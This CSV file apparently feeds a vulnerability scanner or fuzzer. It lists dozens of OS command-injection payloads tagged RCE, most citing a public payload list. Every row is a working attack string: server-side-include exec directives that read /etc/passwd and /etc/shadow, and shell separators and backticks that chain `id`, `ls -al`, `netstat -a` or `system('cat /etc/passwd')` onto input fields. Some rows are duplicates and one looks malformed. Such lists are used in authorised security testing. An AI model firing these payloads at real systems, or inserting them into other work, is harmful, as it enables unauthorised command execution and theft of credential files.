cve,tag,payload,url
,RCE,;ls;,https://github.com/Sma11New/PocList/blob/main/TamronOS-IPTV%E7%B3%BB%E7%BB%9FRCE/TamronOS-IPTV_RCE.py
,RCE,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,https://github.com/payloadbox/command-injection-payload-list
,RCE,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,https://github.com/payloadbox/command-injection-payload-list
,RCE,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,https://github.com/payloadbox/command-injection-payload-list
,RCE,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,https://github.com/payloadbox/command-injection-payload-list
,RCE,/index.html|id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,;id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,;id,https://github.com/payloadbox/command-injection-payload-list
,RCE,;netstat -a;,https://github.com/payloadbox/command-injection-payload-list
,RCE,;system('cat%20/etc/passwd'),https://github.com/payloadbox/command-injection-payload-list
,RCE,;id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,|id,https://github.com/payloadbox/command-injection-payload-list
,RCE,|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,|id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,|/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,||/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,|id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,||/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,;id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,;|/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,\n/bin/ls -al\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,\n/usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,\nid\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,\n/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,\nid;,https://github.com/payloadbox/command-injection-payload-list
,RCE,\n/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,\nid|,https://github.com/payloadbox/command-injection-payload-list
,RCE,;/usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,;id\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,|usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,|nid\n,https://github.com/payloadbox/command-injection-payload-list
,RCE,`id`,https://github.com/payloadbox/command-injection-payload-list
,RCE,`/usr/bin/id`,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,a)|id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a|id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a)|id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a|id,https://github.com/payloadbox/command-injection-payload-list
,RCE,|/bin/ls -al,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a);/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,a;/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
,RCE,a)|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,a)|/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
,RCE,a|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
,RCE,;system('cat%20/etc/passwd'),https://github.com/payloadbox/command-injection-payload-list
